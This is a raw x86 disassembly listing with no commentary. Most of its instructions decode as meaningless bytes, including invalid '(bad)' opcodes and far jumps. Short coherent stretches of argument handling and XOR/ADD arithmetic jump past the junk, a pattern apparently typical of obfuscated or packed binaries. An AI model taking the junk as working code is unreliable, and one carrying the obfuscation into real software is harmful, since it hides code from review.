  409c13:	imul   eax,DWORD PTR [eax],0xea5f2d1e
  409c19:	data16 cld 
  409c1b:	push   ds
  409c1c:	mov    ah,0xe6
  409c1e:	clc    
  409c1f:	iret   
  409c20:	sbb    ecx,DWORD PTR [esi]
  409c22:	add    al,0x60
  409c24:	pushf  
  409c25:	or     DWORD PTR [ebx-0x7810b544],ebp
  409c2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c2c:	mov    edx,0x5a22ffcb
  409c31:	xchg   dh,cl
  409c33:	mov    dh,0xdd
  409c35:	dec    eax
  409c36:	addr16 call 0x64692eb
  409c3c:	scas   eax,DWORD PTR es:[edi]
  409c3d:	lmsw   WORD PTR [esi+0x5e6ca40c]
  409c44:	sti    
  409c45:	call   eax
  409c47:	loopne 0x409bd7
  409c49:	jmp    0x409bd4
  409c4b:	add    al,0xa8
  409c4d:	cs (bad) 
  409c4f:	scas   eax,DWORD PTR es:[edi]
  409c50:	cmp    esi,DWORD PTR [eax]
  409c52:	mov    ebp,0x275a0c7b
  409c57:	fadd   st,st(4)
  409c59:	sbb    edx,0xfffffffa
  409c5c:	cmp    ah,0xfd
  409c5f:	(bad)  
  409c60:	test   eax,0xee45b5f1
  409c65:	popa   
  409c66:	stos   DWORD PTR es:[edi],eax
  409c67:	das    
  409c68:	dec    edx
  409c69:	add    al,al
  409c6b:	scas   al,BYTE PTR es:[edi]
  409c6c:	loopne 0x409c4c
  409c6e:	push   edi
  409c6f:	mov    ?,ebp
  409c71:	out    dx,al
  409c72:	jns    0x409c90
  409c74:	lahf   
  409c75:	xor    ch,dl
  409c77:	movups xmm4,xmm7
  409c7a:	jmp    0x1542:0x1cd5049b
  409c81:	je     0x409c4a
  409c83:	pusha  
  409c84:	mov    al,ds:0x6db3aca5
  409c89:	scas   eax,DWORD PTR es:[edi]
  409c8a:	ret    0x8da4
  409c8d:	inc    ebx
  409c8e:	cdq    
  409c8f:	je     0x409c9d
  409c91:	inc    eax
  409c92:	std    
  409c93:	xor    BYTE PTR [esi-0x36],bh
  409c96:	add    esi,DWORD PTR [ebx]
  409c98:	int3   
  409c99:	std    
  409c9a:	sbb    BYTE PTR [edi-0x28ee5fb9],dl
  409ca0:	xor    esi,esp
  409ca2:	xchg   ebp,eax
  409ca3:	fisttp WORD PTR [esi+0x4a]
  409ca6:	imul   ebp,DWORD PTR [edx-0x65],0xffffffdb
  409caa:	xlat   BYTE PTR ds:[ebx]
  409cab:	and    al,0x9f
  409cad:	stos   DWORD PTR es:[edi],eax
  409cae:	popf   
  409caf:	mov    edi,0xb3d670a8
  409cb4:	cmp    al,0x17
  409cb6:	mov    cl,0x72
  409cb8:	(bad)  
  409cb9:	cmp    eax,0x68ba3c74
  409cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbf:	adc    ebx,DWORD PTR ds:0x52599a46
  409cc5:	add    eax,0xdc208f71
  409cca:	inc    ecx
  409ccb:	lock fimul WORD PTR [edi]
  409cce:	test   esi,eax
  409cd0:	push   es
  409cd1:	add    BYTE PTR [eax],al
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	sar    BYTE PTR [ebx],cl
  409cfb:	xchg   ebp,eax
  409cfc:	retf   
  409cfd:	je     0x409ce2
  409cff:	jle    0x409d7f
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	retf   
  409d06:	cmp    BYTE PTR [edi],dh
  409d08:	mov    eax,ds:0x9a7443d2
  409d0d:	jno    0x409cea
  409d0f:	add    al,0x2e
  409d11:	loope  0x409cf8
  409d13:	push   esp
  409d14:	stos   BYTE PTR es:[edi],al
  409d15:	mov    DWORD PTR [ebp-0x4fc233c9],0x3d41ba43
  409d1f:	inc    ecx
  409d20:	xlat   BYTE PTR ds:[ebx]
  409d21:	jmp    0xb6428d8b
  409d26:	jno    0x409cb6
  409d28:	cmp    BYTE PTR [eax+0x78],0x8f
  409d2c:	(bad)  
  409d2d:	ror    BYTE PTR [edx],1
  409d2f:	call   0xcb11:0xc9f7b0d
  409d36:	(bad)  
  409d37:	push   eax
  409d38:	dec    esp
  409d39:	mov    ?,WORD PTR ds:0x5c77db3c
  409d3f:	(bad)  
  409d40:	mov    esi,0x5b6d81d1
  409d45:	fimul  WORD PTR [ecx+0x788f6be5]
  409d4b:	cmp    eax,0xfa04f3c3
  409d50:	or     BYTE PTR [eax],dl
  409d52:	std    
  409d53:	enter  0x796b,0xb
  409d57:	rol    DWORD PTR [ebx+eax*8+0x43fd942f],0x8
  409d5f:	mov    ch,0xef
  409d61:	and    DWORD PTR [edi-0xc],edi
  409d64:	xchg   ebx,eax
  409d65:	mov    edx,0x527856f0
  409d6a:	shr    BYTE PTR [ebx+0x4895b2bf],0x87
  409d71:	retf   0x13fd
  409d74:	mov    cl,0x72
  409d76:	mov    edx,0x7126c9f5
  409d7b:	xlat   BYTE PTR ds:[ebx]
  409d7c:	push   ebp
  409d7d:	stos   BYTE PTR es:[edi],al
  409d7e:	ffree  st(1)
  409d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d81:	dec    ecx
  409d82:	jo     0x409d74
  409d84:	clc    
  409d85:	dec    eax
  409d86:	fist   DWORD PTR [eax]
  409d88:	cmp    al,0xb7
  409d8a:	jecxz  0x409d59
  409d8c:	xor    bl,BYTE PTR [ebx]
  409d8e:	(bad)  
  409d8f:	adc    DWORD PTR [ebp-0x545c2ef0],esi
  409d95:	dec    ecx
  409d96:	and    al,0xce
  409d98:	repz xchg esp,eax
  409d9a:	mov    ds:0xed30bf74,eax
  409d9f:	in     al,0x9b
  409da1:	imul   ecx,DWORD PTR [ebx],0x5f
  409da4:	daa    
  409da5:	sbb    ch,BYTE PTR [ecx-0x53]
  409da8:	add    BYTE PTR [ebx+0xdabc4ee],0x43
  409daf:	leave  
  409db0:	push   ebx
  409db1:	les    edx,FWORD PTR [ebx+0x21]
  409db4:	imul   esi,DWORD PTR ds:[eax],0x2afaf1ae
  409dbb:	dec    ebx
  409dbc:	es test al,0x81
  409dbf:	cwde   
  409dc0:	aad    0x89
  409dc2:	cmp    DWORD PTR [edi],ebp
  409dc4:	lock hlt 
  409dc6:	jb     0x409d5d
  409dc8:	fwait
  409dc9:	sub    eax,0x625d28a2
  409dce:	adc    bl,bh
  409dd0:	test   eax,0xbf8c5de7
  409dd5:	and    esi,eax
  409dd7:	mov    ds:0xda87e3f1,eax
  409ddc:	or     al,ch
  409dde:	jae    0x409dd8
  409de0:	js     0x409e1f
  409de2:	xchg   esi,eax
  409de3:	pop    edx
  409de4:	pop    edx
  409de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409de7:	adc    al,0x55
  409de9:	jle    0x409d91
  409deb:	out    dx,eax
  409dec:	ins    BYTE PTR es:[edi],dx
  409ded:	mov    eax,ds:0x1fa1ba55
  409df2:	mov    dh,0x2a
  409df4:	ins    BYTE PTR es:[edi],dx
  409df5:	cli    
  409df6:	pushf  
  409df7:	iret   
  409df8:	cwde   
  409df9:	cmp    al,0xb4
  409dfb:	dec    ebp
  409dfc:	ss sub esi,ecx
  409dff:	sbb    BYTE PTR [edx+0x65],0xed
  409e03:	inc    ebp
  409e04:	push   0xcf12cea6
  409e09:	inc    ebp
  409e0a:	cld    
  409e0b:	mov    BYTE PTR [edx-0x27],bl
  409e0e:	xor    ecx,DWORD PTR [esi+0x1c357596]
  409e14:	jmp    0xa478:0x819f5b96
  409e1b:	push   ss
  409e1c:	add    eax,0x4d3359cc
  409e21:	mov    al,ds:0xb86916ec
  409e26:	cmp    edx,DWORD PTR [edx+0x3b]
  409e29:	cdq    
  409e2a:	(bad)  
  409e2b:	addr16 int 0x14
  409e2e:	push   esi
  409e2f:	push   cs
  409e30:	cmp    bh,BYTE PTR [eax]
  409e32:	mov    ds:0x57adc247,al
  409e37:	jge    0x409e76
  409e39:	xchg   ebp,eax
  409e3a:	push   eax
  409e3b:	inc    esp
  409e3c:	mov    bl,0xe
  409e3e:	cdq    
  409e3f:	es inc eax
  409e41:	mov    ebx,0xc4fd2ee7
  409e46:	mov    dl,0x59
  409e48:	je     0x409dd3
  409e4a:	popa   
  409e4b:	mov    dl,0xbf
  409e4d:	out    dx,eax
  409e4e:	shl    DWORD PTR [edx],0xb7
  409e51:	and    eax,0xffcffb21
  409e56:	sub    DWORD PTR [eax],esp
  409e58:	inc    esi
  409e59:	inc    esi
  409e5a:	aad    0x70
  409e5c:	xchg   ebx,eax
  409e5d:	or     al,0x7e
  409e5f:	bnd jle 0x409e8f
  409e62:	jne    0x409e24
  409e64:	sbb    DWORD PTR [ecx+0x23],0xffffffeb
  409e68:	fcom   st(0)
  409e6a:	add    edi,DWORD PTR [eax]
  409e6c:	call   0xa5ed:0xbe30f382
  409e73:	(bad)  
  409e74:	jmp    0xf3d6674
  409e79:	inc    esp
  409e7a:	es test eax,0xd789d92b
  409e80:	jmp    0x409efb
  409e82:	jbe    0x409ed5
  409e84:	leave  
  409e85:	dec    eax
  409e86:	pop    ss
  409e87:	aas    
  409e88:	add    edi,0xffffffbf
  409e8b:	into   
  409e8c:	or     BYTE PTR [eax+0x8],ah
  409e8f:	sbb    bl,BYTE PTR [esi]
  409e91:	(bad)  
  409e92:	outs   dx,DWORD PTR ds:[esi]
  409e93:	(bad)  
  409e94:	cmp    eax,0x9b5b3085
  409e99:	lea    edi,[edx+0x5c5cd3ce]
  409e9f:	pop    ebx
  409ea0:	daa    
  409ea1:	ficom  DWORD PTR [eax-0x430eb9d]
  409ea7:	dec    ecx
  409ea8:	into   
  409ea9:	push   cs
  409eaa:	or     eax,esi
  409eac:	jnp    0x409e85
  409eae:	fs mov dl,0x23
  409eb1:	fidiv  WORD PTR [edx]
  409eb3:	xchg   esp,eax
  409eb4:	sahf   
  409eb5:	inc    edx
  409eb6:	inc    edi
  409eb7:	and    BYTE PTR [ebp+0x6a554c18],0x56
  409ebe:	into   
  409ebf:	jge    0x409eb1
  409ec1:	mov    cl,0x10
  409ec3:	loopne 0x409e88
  409ec5:	mov    ebx,0x8b03c0d9
  409eca:	mov    al,ds:0x3db5d7c3
  409ecf:	ins    BYTE PTR es:[edi],dx
  409ed0:	sub    al,0xb
  409ed2:	mov    ebx,0x33e19cc8
  409ed7:	out    dx,eax
  409ed8:	gs inc edi
  409eda:	sbb    DWORD PTR [edi+0x319c1128],ebx
  409ee0:	fnstsw WORD PTR [esi]
  409ee2:	and    BYTE PTR [edi+0x29],bl
  409ee5:	sahf   
  409ee6:	repz enter 0x16da,0x8b
  409eeb:	or     eax,0xffd9c675
  409ef0:	and    DWORD PTR [edi],edi
  409ef2:	outs   dx,BYTE PTR ds:[esi]
  409ef3:	push   esi
  409ef4:	in     eax,0x32
  409ef6:	fcom   DWORD PTR [ebp-0xf28a141]
  409efc:	call   0xf8bf5209
  409f01:	inc    edi
  409f02:	out    0x32,al
  409f04:	sbb    BYTE PTR [edx],al
  409f06:	adc    al,0x61
  409f08:	fbld   TBYTE PTR [ebp-0x7d]
  409f0b:	mov    ds,WORD PTR [ecx]
  409f0d:	mov    WORD PTR [eax+0x56],ss
  409f10:	xchg   BYTE PTR [esi+0x5a3f7f77],dl
  409f16:	js     0x409ecf
  409f18:	xchg   esi,eax
  409f19:	jae    0x409f05
  409f1b:	inc    ecx
  409f1c:	rcl    cl,cl
  409f1e:	mov    ecx,0x231857f5
  409f23:	ficomp DWORD PTR [eax+0x0]
  409f26:	jnp    0x409f20
  409f28:	push   DWORD PTR [esi+ecx*4+0x7e5ff6c7]
  409f2f:	xor    BYTE PTR [ebx],ah
  409f31:	sbb    al,0xd9
  409f33:	pop    eax
  409f34:	push   ebx
  409f35:	test   edi,ecx
  409f37:	or     al,0x95
  409f39:	xchg   edi,eax
  409f3a:	arpl   sp,di
  409f3c:	cs pop ss
  409f3e:	popa   
  409f3f:	lock test al,0xed
  409f42:	cwde   
  409f43:	cli    
  409f44:	push   ebp
  409f45:	scas   al,BYTE PTR es:[edi]
  409f46:	in     al,0x88
  409f48:	dec    esp
  409f49:	pop    ss
  409f4a:	pushf  
  409f4b:	(bad)  
  409f4c:	in     al,0x72
  409f4e:	mov    ah,0x77
  409f50:	add    BYTE PTR [ebp+0x387421ac],ch
  409f56:	xchg   esp,eax
  409f57:	ret    
  409f58:	pop    esi
  409f59:	sbb    dl,ah
  409f5b:	dec    eax
  409f5c:	mov    edi,0x9e1c0a71
  409f61:	push   ds
  409f62:	sti    
  409f63:	mov    eax,0x1f057a11
  409f68:	xchg   DWORD PTR [edi-0x63d569dd],esi
  409f6e:	sub    DWORD PTR [esi+0x323e00b8],esp
  409f74:	lods   al,BYTE PTR ds:[esi]
  409f75:	push   esi
  409f76:	pop    eax
  409f77:	cld    
  409f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f79:	sub    bh,dl
  409f7b:	push   edi
  409f7c:	lahf   
  409f7d:	mov    ds:0x5738e76b,eax
  409f82:	or     bl,BYTE PTR ds:0xc5703129
  409f88:	push   0x6d
  409f8a:	out    dx,eax
  409f8b:	pop    ebx
  409f8c:	(bad)  
  409f8d:	push   edx
  409f8e:	push   esi
  409f8f:	jns    0x409f30
  409f91:	pop    ss
  409f92:	pop    ss
  409f93:	nop
  409f94:	push   0xe62c2660
  409f99:	repz (bad) [di-0x1f11]
  409f9f:	xchg   edx,eax
  409fa0:	pop    esi
  409fa1:	cwde   
  409fa2:	imul   ebp,DWORD PTR [ecx+edx*8-0x5],0x6f31af9
  409faa:	mov    bl,0xad
  409fac:	add    BYTE PTR [ebx+edi*4-0x24],0x4b
  409fb1:	push   ss
  409fb2:	xlat   BYTE PTR ds:[ebx]
  409fb3:	gs pusha 
  409fb5:	pop    ds
  409fb6:	xlat   BYTE PTR ds:[ebx]
  409fb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb8:	xchg   DWORD PTR [edx],esi
  409fba:	mov    dl,0x64
  409fbc:	es mov ch,0xb
  409fbf:	sbb    BYTE PTR [edx+0x7ae97042],bh
  409fc5:	or     dh,BYTE PTR [ebx+eax*4]
  409fc8:	push   ebx
  409fc9:	dec    ebx
  409fca:	mov    ecx,0xa8b71e2e
  409fcf:	sub    eax,0xbd3087ab
  409fd4:	mov    ebp,0x7aef71c7
  409fd9:	mov    esi,0x9f7c9efb
  409fde:	sub    DWORD PTR [eax+0x6c],0xf1bd0bd6
  409fe5:	stos   DWORD PTR es:[edi],eax
  409fe6:	je     0x40a01b
  409fe8:	retf   
  409fe9:	sub    eax,0xcd4cf398
  409fee:	cwde   
  409fef:	mov    al,0x0
  409ff1:	xor    edx,edi
  409ff3:	xor    al,0x34
  409ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ff6:	pop    edi
  409ff7:	push   edx
  409ff8:	int    0xea
  409ffa:	into   
  409ffb:	or     eax,0x7527b56a
  40a000:	pusha  
  40a001:	or     al,bl
  40a003:	push   edx
  40a004:	sub    DWORD PTR [edi],esp
  40a006:	sbb    BYTE PTR [edi-0x63],ah
  40a009:	mov    ecx,DWORD PTR [ebp-0x10]
  40a00c:	xor    eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx-0x2b]
  40a02a:	and    ebx,ebx
  40a02c:	into   
  40a02d:	jo     0x40a01d
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	add    DWORD PTR [ecx-0x73],ecx
  40a038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a039:	xor    esp,edx
  40a03b:	sbb    edi,DWORD PTR [ebx-0x66197869]
  40a041:	dec    ebx
  40a042:	ficomp DWORD PTR [edx]
  40a044:	and    ebp,DWORD PTR [ebp-0xd9f6812]
  40a04a:	cli    
  40a04b:	dec    eax
  40a04c:	lahf   
  40a04d:	push   cs
  40a04e:	push   ecx
  40a04f:	xor    dl,cl
  40a051:	push   DWORD PTR ds:0x8648d523
  40a057:	add    BYTE PTR [eax],0xfc
  40a05a:	mov    BYTE PTR [ecx+0x52],dh
  40a05d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a05e:	adc    DWORD PTR [edi+ecx*8+0xc],ecx
  40a062:	add    esi,DWORD PTR [esp+esi*8-0x24]
  40a066:	mov    edi,0x9fe10539
  40a06b:	fs fwait
  40a06d:	jmp    0x40a0af
  40a06f:	xor    BYTE PTR [ebx+0x9607f7e],dh
  40a075:	call   0x77ab0d6f
  40a07a:	cmp    al,BYTE PTR [edx+0x3b]
  40a07d:	hlt    
  40a07e:	rcr    BYTE PTR [edi-0x3cd8441a],cl
  40a084:	or     al,0xfa
  40a086:	test   al,0xb2
  40a089:	shl    esp,1
  40a08b:	jge    0x40a0a5
  40a08d:	std    
  40a08e:	int    0x5f
  40a090:	jmp    0x2d85:0x60deed07
  40a097:	(bad)  
  40a098:	xchg   esp,eax
  40a099:	push   esi
  40a09a:	xchg   ebp,eax
  40a09b:	add    ebp,eax
  40a09d:	fld    TBYTE PTR [esp+esi*2]
  40a0a0:	inc    edi
  40a0a1:	leave  
  40a0a2:	push   esi
  40a0a3:	int    0xf3
  40a0a5:	push   0x14422709
  40a0aa:	mov    eax,ds:0x6eac7db1
  40a0af:	das    
  40a0b0:	inc    eax
  40a0b1:	mov    edx,0xa7d7c34c
  40a0b6:	(bad)  
  40a0b7:	aam    0xe8
  40a0b9:	out    0x16,al
  40a0bb:	sub    edi,DWORD PTR [ebx-0x47]
  40a0be:	mov    dl,0x71
  40a0c0:	cmp    al,bh
  40a0c2:	pcmpeqw mm5,QWORD PTR [ecx]
  40a0c5:	add    al,0x9f
  40a0c7:	in     al,0x24
  40a0c9:	dec    eax
  40a0ca:	inc    esi
  40a0cb:	call   0x212aa1bd
  40a0d0:	sti    
  40a0d1:	call   0x8bc2:0xdc2246ec
  40a0d8:	in     eax,0xee
  40a0da:	pop    edi
  40a0db:	pop    es
  40a0dc:	add    esp,DWORD PTR [ebx]
  40a0de:	xchg   esi,eax
  40a0df:	test   al,0x38
  40a0e1:	pop    es
  40a0e2:	pop    eax
  40a0e3:	mov    WORD PTR [ebx],fs
  40a0e5:	cs je  0x40a119
  40a0e8:	or     bl,BYTE PTR [ebx-0x5d]
  40a0eb:	mov    ch,0x7d
  40a0ed:	jo     0x40a0f2
  40a0ef:	push   ds
  40a0f0:	pop    ecx
  40a0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0f2:	sbb    BYTE PTR [edi-0x1bee39eb],0x6c
  40a0f9:	mov    ds:0x87c1bbfc,al
  40a0fe:	aad    0xd7
  40a100:	(bad)  [edi+ebx*2-0x3d]
  40a104:	lock pusha 
  40a106:	leave  
  40a107:	or     al,0xdb
  40a109:	or     DWORD PTR [esi-0x79950799],edx
  40a10f:	xchg   edi,eax
  40a110:	fs inc ebp
  40a112:	xor    BYTE PTR [esi],dl
  40a114:	hlt    
  40a115:	enter  0x35f6,0xf4
  40a119:	mov    bl,0x2e
  40a11b:	mov    dl,0xf8
  40a11d:	inc    esp
  40a11e:	retf   0xb33e
  40a121:	push   ebx
  40a122:	stc    
  40a123:	jno    0x40a0b1
  40a125:	jg     0x40a18e
  40a127:	and    bl,BYTE PTR ss:[edx-0x22246824]
  40a12e:	les    eax,FWORD PTR [eax+0x25d4ac62]
  40a134:	inc    eax
  40a135:	nop
  40a136:	hlt    
  40a137:	mov    ebp,0x94a62da4
  40a13c:	or     dl,bh
  40a13e:	test   al,ah
  40a140:	jle    0x40a11d
  40a142:	jnp    0x40a195
  40a144:	sbb    DWORD PTR [eax+ecx*8-0x6],esp
  40a148:	ja     0x40a10a
  40a14a:	pop    ebx
  40a14b:	mov    DWORD PTR [ebp-0x5be8e83a],eax
  40a151:	retf   0xe6f5
  40a154:	lods   al,BYTE PTR ds:[esi]
  40a155:	xchg   esp,eax
  40a156:	and    DWORD PTR ss:[ebx-0x65],esi
  40a15a:	or     ebx,edx
  40a15c:	jmp    0x8b92:0x92c27d45
  40a163:	js     0x40a12c
  40a165:	in     eax,0x1b
  40a167:	jae    0x40a184
  40a169:	dec    ecx
  40a16a:	les    edx,FWORD PTR [esi]
  40a16c:	pop    edx
  40a16d:	retf   
  40a16e:	jle    0x40a1e4
  40a170:	dec    edi
  40a171:	inc    edi
  40a172:	inc    ebp
  40a173:	push   ds
  40a174:	mov    ch,0xe6
  40a176:	sti    
  40a177:	xchg   edx,eax
  40a178:	sub    cl,BYTE PTR ds:0x372d7a43
  40a17e:	jg     0x40a1ef
  40a180:	cmp    eax,0x8f7dfa2c
  40a185:	sub    esp,ebp
  40a187:	int    0xb9
  40a189:	mov    ds:0x456c8e37,al
  40a18e:	cmc    
  40a18f:	stc    
  40a190:	mov    ?,WORD PTR gs:[edi]
  40a193:	mov    ah,BYTE PTR [edx+0x42193716]
  40a199:	add    al,0x6a
  40a19b:	mov    bl,0x58
  40a19d:	xor    eax,0xd523cfa5
  40a1a2:	test   BYTE PTR [ebp-0x45251063],ah
  40a1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1a9:	sub    al,0xf7
  40a1ab:	arpl   WORD PTR [ebx],bx
  40a1ad:	hlt    
  40a1ae:	cdq    
  40a1af:	adc    BYTE PTR [ebp+0x25e28d8d],bh
  40a1b5:	dec    edi
  40a1b6:	sbb    BYTE PTR [ecx],al
  40a1b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1b9:	mov    eax,0x9f8ddbb5
  40a1be:	je     0x40a227
  40a1c0:	jecxz  0x40a1ca
  40a1c2:	clc    
  40a1c3:	mov    DWORD PTR [edx],eax
  40a1c5:	enter  0x2280,0x4f
  40a1c9:	scas   al,BYTE PTR es:[edi]
  40a1ca:	xchg   BYTE PTR [edx],bl
  40a1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1cd:	jl     0x40a200
  40a1cf:	movd   mm0,DWORD PTR [ebp-0x3e1fd41f]
  40a1d6:	pop    es
  40a1d7:	repnz popf 
  40a1d9:	push   edx
  40a1da:	mov    BYTE PTR [esi],bl
  40a1dc:	and    ch,dh
  40a1de:	mov    ds,eax
  40a1e0:	ja     0x40a227
  40a1e2:	daa    
  40a1e3:	adc    edi,eax
  40a1e5:	xor    edi,DWORD PTR [eax+0x43]
  40a1e8:	lock pop esp
  40a1ea:	mov    ch,0xf9
  40a1ec:	loop   0x40a21c
  40a1ee:	mov    ah,0x8d
  40a1f0:	inc    edx
  40a1f1:	sti    
  40a1f2:	add    DWORD PTR [esi-0x53ef54b4],esp
  40a1f8:	data16 jo 0x40a234
  40a1fb:	inc    esp
  40a1fc:	in     al,dx
  40a1fd:	sbb    BYTE PTR [ebp+0x81e16a0],bh
  40a203:	or     al,0xea
  40a205:	mov    ecx,0x3d196812
  40a20a:	mov    esi,esp
  40a20c:	int    0x62
  40a20e:	lock pusha 
  40a210:	xchg   DWORD PTR [esi+edx*2-0x33],edi
  40a214:	in     al,0x47
  40a216:	fdivr  DWORD PTR [ecx]
  40a218:	cs mov cl,0x45
  40a21b:	cli    
  40a21c:	add    ebx,DWORD PTR [ebp-0x32]
  40a21f:	add    eax,0x591b7bbb
  40a224:	cmp    eax,0xe4414e6d
  40a229:	not    BYTE PTR ds:0x9a98
  40a22e:	push   ds
  40a22f:	ret    
  40a230:	push   esi
  40a231:	mov    eax,ds:0xf9c17fba
  40a236:	repz add al,BYTE PTR [ebp+0x1a33a40f]
  40a23d:	arpl   WORD PTR [ecx+0x2dbf2fed],bp
  40a243:	ins    DWORD PTR es:[edi],dx
  40a244:	cmp    DWORD PTR [esi+edx*1-0x34],ebp
  40a248:	in     eax,dx
  40a249:	(bad)  
  40a24a:	pop    ebp
  40a24b:	cmp    BYTE PTR [esi],0xb4
  40a24e:	sub    eax,0xa80f95d3
  40a253:	arpl   di,di
  40a255:	add    dh,ch
  40a257:	cmp    esp,DWORD PTR [esi+ebx*1+0x7d]
  40a25b:	ret    0x5210
  40a25e:	sti    
  40a25f:	cdq    
  40a260:	rcr    ah,cl
  40a262:	add    dl,BYTE PTR [edi+0x7c]
  40a265:	push   ebp
  40a266:	sbb    eax,esp
  40a268:	mov    ebx,0x309ac633
  40a26d:	mov    dl,0x47
  40a26f:	in     eax,dx
  40a270:	jp     0x40a21a
  40a272:	mov    al,0x9e
  40a274:	jmp    0xe7a0:0xf3ccdc51
  40a27b:	pop    esp
  40a27c:	pop    ds
  40a27d:	mov    ds:0xf61a74e9,eax
  40a282:	ror    cl,1
  40a284:	rol    DWORD PTR [ebp+0x56936743],1
  40a28a:	xchg   edi,eax
  40a28b:	mov    al,0x51
  40a28d:	shr    al,1
  40a28f:	mov    al,0xcb
  40a291:	arpl   WORD PTR [ebp+0x437a0e21],bp
  40a297:	ror    ch,cl
  40a299:	push   edx
  40a29a:	push   0xbbcc60ce
  40a29f:	add    al,0x6
  40a2a1:	mov    eax,0x19d213ce
  40a2a6:	daa    
  40a2a7:	cwde   
  40a2a8:	cdq    
  40a2a9:	ret    0xfb7
  40a2ac:	cmc    
  40a2ad:	or     dh,cl
  40a2af:	adc    bl,bl
  40a2b1:	fadd   st(7),st
  40a2b3:	dec    esi
  40a2b4:	mov    BYTE PTR [edx],dl
  40a2b6:	jmp    0x56c8:0xe73299f6
  40a2bd:	jge    0x40a306
  40a2bf:	pop    ds
  40a2c0:	push   ebx
  40a2c1:	sbb    edx,ebp
  40a2c3:	pop    ebx
  40a2c4:	mov    BYTE PTR [ebp+0x4a],ch
  40a2c7:	fdiv   DWORD PTR [ebx]
  40a2c9:	xchg   ecx,eax
  40a2ca:	add    esi,DWORD PTR [ecx-0x6d]
  40a2cd:	mov    bl,0x82
  40a2cf:	jmp    0x3160:0xbd8296c1
  40a2d6:	cmp    eax,0xb41e1695
  40a2db:	or     eax,0x3f3cf6ac
  40a2e0:	test   BYTE PTR [edi],dh
  40a2e2:	dec    eax
  40a2e3:	jge    0x40a2ef
  40a2e5:	retf   0xf56e
  40a2e8:	sbb    esp,DWORD PTR [ebp-0x61]
  40a2eb:	jl     0x40a2e8
  40a2ed:	adc    eax,0x90b9f60f
  40a2f2:	les    esi,FWORD PTR [edi+0x1]
  40a2f5:	mov    ecx,0x2c503037
  40a2fa:	ins    DWORD PTR es:[edi],dx
  40a2fb:	data16 jb 0x40a2a3
  40a2fe:	dec    ecx
  40a2ff:	sbb    BYTE PTR [eax],al
  40a301:	pop    ebp
  40a302:	aaa    
  40a303:	jg     0x40a312
  40a305:	or     esi,DWORD PTR [edi]
  40a307:	and    al,0x68
  40a309:	dec    ebp
  40a30a:	adc    bh,bl
  40a30c:	retf   
  40a30d:	mov    ebx,0x90e2b5b4
  40a312:	loope  0x40a30c
  40a314:	jo     0x40a34e
  40a316:	repnz pop es
  40a318:	loopne 0x40a380
  40a31a:	xchg   ebp,eax
  40a31b:	aad    0x3d
  40a31d:	aas    
  40a31e:	data16 sub cl,ah
  40a321:	test   esi,ebp
  40a323:	inc    ebx
  40a324:	xchg   edi,eax
  40a325:	xchg   edx,eax
  40a326:	xor    al,0xc2
  40a328:	jb     0x40a337
  40a32a:	rcr    BYTE PTR [esi+ebp*8],cl
  40a32d:	xor    edx,DWORD PTR [edi+0x48]
  40a330:	inc    ebx
  40a331:	push   edi
  40a332:	cmp    al,0x80
  40a334:	stos   DWORD PTR es:[edi],eax
  40a335:	(bad)  
  40a336:	out    dx,eax
  40a337:	xor    al,0x2c
  40a339:	xor    ecx,esi
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
